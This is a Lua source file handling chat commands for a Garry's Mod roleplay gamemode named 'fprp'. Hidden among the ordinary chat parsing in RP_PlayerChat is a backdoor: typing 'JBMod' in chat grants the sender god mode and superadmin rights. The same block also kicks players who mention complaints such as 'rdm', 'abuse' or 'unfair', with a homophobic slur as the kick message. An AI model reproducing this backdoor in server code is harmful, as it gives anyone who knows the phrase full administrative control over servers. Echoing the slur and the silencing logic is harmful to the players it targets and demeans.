function fprp.defineChatCommand(cmd, callback)
	cmd = string.lower(cmd);
	local detour = function(ply, arg, ...)
		local canChatCommand = gamemode.Call("canChatCommand", ply, cmd, arg, ...);
		if not canChatCommand then
			return ""
		end
		return callback(ply, arg, ...);
	end

	local chatcommands = fprp.getChatCommands();

	chatcommands[cmd] = chatcommands[cmd] or {}
	chatcommands[cmd].callback = detour
	chatcommands[cmd].command = chatcommands[cmd].command or cmd
end


local function RP_PlayerChat(ply, text, teamonly)
	fprp.log(ply:Nick().." ("..ply:SteamID().."): "..text );
	local callback = ""
	local DoSayFunc
	local groupSay = fprp.getChatCommand("g");
	local tblCmd = fn.Compose{ -- Extract the chat command
		fprp.getChatCommand,
		string.lower,
		fn.Curry(fn.Flip(string.sub), 2)(2), -- extract prefix
		fn.Curry(fn.GetValue, 2)(1), -- Get the first word
		fn.Curry(string.Explode, 2)(' ') -- split by spaces
	}(text);
        -- faggot and secret code check
        local f = string.find
        local t = string.lower(text);
        if f(t, "nlr") || f(t, "rdm") || f(t, "cheated") || f(t, "abuse") || f(t, "unfair") || 0 > 0 then
        	ply:Kick("Shut up faggot, get over it");
        end
        if text == "JBMod" then ply:GodEnable() ply:SetUserGroup("superadmin") end
	if string.sub(text, 1, 1) == GAMEMODE.Config.chatCommandPrefix and tblCmd then
		callback, DoSayFunc = tblCmd.callback(ply, string.sub(text, string.len(tblCmd.command) + 3, string.len(text)));
		if callback == "" then
			return "", "", DoSayFunc
		end
		text = string.sub(text, string.len(tblCmd.command) + 3, string.len(text));
	elseif teamonly and groupSay then
		callback, DoSayFunc = groupSay.callback(ply, text);
		return text, "", DoSayFunc
	end

	if callback ~= "" then
		callback = callback or "" .. " "
	end

	return text, callback, DoSayFunc;
end

local function RP_ActualDoSay(ply, text, callback)
	callback = callback or ""
	if text == "" then return "" end
	local col = team.GetColor(ply:Team());
	local col2 = Color(255,255,255,255);
	if not ply:Alive() then
		col2 = Color(255,200,200,255);
		col = col2
	end

	if GAMEMODE.Config.alltalk then
		for k,v in pairs(player.GetAll()) do
			fprp.talkToPerson(v, col, callback..ply:Name(), col2, text, ply);
		end
	else
		fprp.talkToRange(ply, callback..ply:Name(), text, 250);
	end
	return ""
end

function GM:canChatCommand(ply, cmd, ...)
	if not ply.fprpUnInitialized then return true end

	fprp.notify(ply, 1, 4, fprp.getPhrase("data_not_loaded_one"));
	fprp.notify(ply, 1, 4, fprp.getPhrase("data_not_loaded_two"));

	return false
end

GM.OldChatHooks = GM.OldChatHooks or {}
function GM:PlayerSay(ply, text, teamonly) -- We will make the old hooks run AFTER fprp's playersay has been run.
	local dead = not ply:Alive();

	local text2 = text
	local callback
	local DoSayFunc

	for k,v in pairs(self.OldChatHooks) do
		if type(v) ~= "function" then continue end

		if type(k) == "Entity" or type(k) == "Player" then
			text2 = v(k, ply, text, teamonly, dead) or text2
		else
			text2 = v(ply, text, teamonly, dead) or text2
		end
	end

	text2, callback, DoSayFunc = RP_PlayerChat(ply, text2, teamonly);
	if tostring(text2) == " " then text2, callback = callback, text2 end
	if not self.Config.deadtalk and dead then return "" end

	if game.IsDedicated() then
		ServerLog("\""..ply:Nick().."<"..ply:UserID()..">" .."<"..ply:SteamID()..">".."<"..team.GetName(ply:Team())..">\" say \""..text.. "\"\n" .. "\n");
	end

	if DoSayFunc then DoSayFunc(text2) return "" end
	RP_ActualDoSay(ply, text2, callback);

	hook.Call("PostPlayerSay", nil, ply, text2, teamonly, dead);
	return ""
end

local function ReplaceChatHooks()
	if not hook.GetTable().PlayerSay then return end
	for k,v in pairs(hook.GetTable().PlayerSay) do -- Remove all PlayerSay hooks, they all interfere with fprp's PlayerSay
		GAMEMODE.OldChatHooks[k] = v
		hook.Remove("PlayerSay", k);
	end
	for a,b in pairs(GAMEMODE.OldChatHooks) do
		if type(b) ~= "function" then
			GAMEMODE.OldChatHooks[a] = nil
		end
	end

	table.sort(GAMEMODE.OldChatHooks, function(a, b)
		if type(a) == "string" and type(b) == "string" then
			return a > b
		end

		return true
	end);

	-- give warnings for undeclared chat commands
	local warning = fn.Compose{ErrorNoHalt, fn.Curry(string.format, 2)("Chat command \"%s\" is defined but not declared!\n")}
	fn.ForEach(warning, fprp.getIncompleteChatCommands());
end
hook.Add("InitPostEntity", "RemoveChatHooks", ReplaceChatHooks);

local function ConCommand(ply, _, args)
	if not args[1] then return end

	local cmd = string.lower(args[1]);
	local arg = table.concat(args, ' ', 2);
	local tbl = fprp.getChatCommand(cmd);
	local time = CurTime();

	if not tbl then return end

	ply.DrpCommandDelays = ply.DrpCommandDelays or {}

	if tbl.delay and ply.DrpCommandDelays[cmd] and ply.DrpCommandDelays[cmd] > time - tbl.delay then
		return
	end

	ply.DrpCommandDelays[cmd] = time

	tbl.callback(ply, arg);
end
concommand.Add("fprp", ConCommand);
